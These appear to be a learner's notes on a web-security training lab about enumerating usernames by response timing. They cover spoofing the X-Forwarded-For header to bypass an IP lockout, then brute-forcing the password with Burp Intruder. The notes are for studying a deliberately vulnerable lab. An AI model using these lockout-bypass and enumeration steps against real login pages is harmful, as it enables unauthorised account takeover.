Lab 05 - Username enumeration via response timing

End goal: Enumerate a valid username and then brute-force the user's password.

Given information:
- Your credentials: wiener:peter
- Candidate usernames
- Candidate passwords

Analysis:

- Attempted a few username/password combinations and analyzed the response time in Burp Repeater
    - test:test (152 ms)  -> Invalid username or password.
    - wiener:test (159ms) -> Invalid username or password.
    - wiener:test (122ms) -> Invalid username or password.
    - wiener:test (105ms) -> You have made too many incorrect login attempts. Please try again in 30 minute(s).
    - IP address is locked out after 3 incorrect attempts.

- See if it's using a weak blocking mechanism.
    - See if it accepts the X-Forwarded-For header, which is the de facto standard header for identifying the originating IP address of a request.
    - Try "X-Forwarded-For: <IP_ADDRESS>" with username:password and see if we have a new error message.
    - Also, examine the response time in the Burp Repeater tab.
        - X-Forwarded-For: 1 
            (wiener:test -> 250ms)
            - "1" is not really a valid IP address, but we are just seeing it we can attempt a new login again on a NEW IP address value
            - it works! We can attempt a login again.
            - after 3 tries, we'll get logged out again on IP address "1"
            - so, we'll try a new address
        - X-Forwarded-For: 2 
            (wiener:test -> 251ms)
            - response time is not much different
            - let's try to login with a longer password...
            - NOTE: try to increase the password length because for some applications they will check if the username is valid first and if it's not 
                    valid, they won't check the password.
                    But if it is valid, they will check the password, and then there might be a time discrepancy between the two.
        - X-Forwarded-For: 3 
            (wiener:testtesttesttest -> 316ms)
        - X-Forwarded-For: 4 
            (wiener:testtesttesttesttesttesttesttest -> 405ms)
        - X-Forwarded-For: 5 
            (wiener:testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttest -> 655ms)
        - NOTE: So every time the password length is increased, it looks like it's doing more computation in the back end and so it's taking 
                longer for the application to respond.
    - Try an invalid username
        - X-Forwarded-For: 5 
            (wiener123123:testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttest -> 239ms)
            - You can see over here it says 239 seconds versus a valid username which was taking over 600 milliseconds.
            - The reason is because when it's an invalid username, it's not actually checking the password because
                it sees that it's an invalid username and so there's no use to check the password.
            - But when it is a valid username, it's checking the password.
                so this issue in the application allows us to enumerate the list of valid usernames in the application.
        - Try all the usernames in the usernames list with a LOOOOONG password (in Burp Intruder or Python script) 
            - all of the invalid usernames will have a short response time
            - the valid username will have a longer response time, because the backend is validating the password now.
                - NOTE: If use Burp Intruder, use "Attack type: Pitchfork"
        - Once you've found the valid username, just iterate through all of the passwords with that username and you are done.
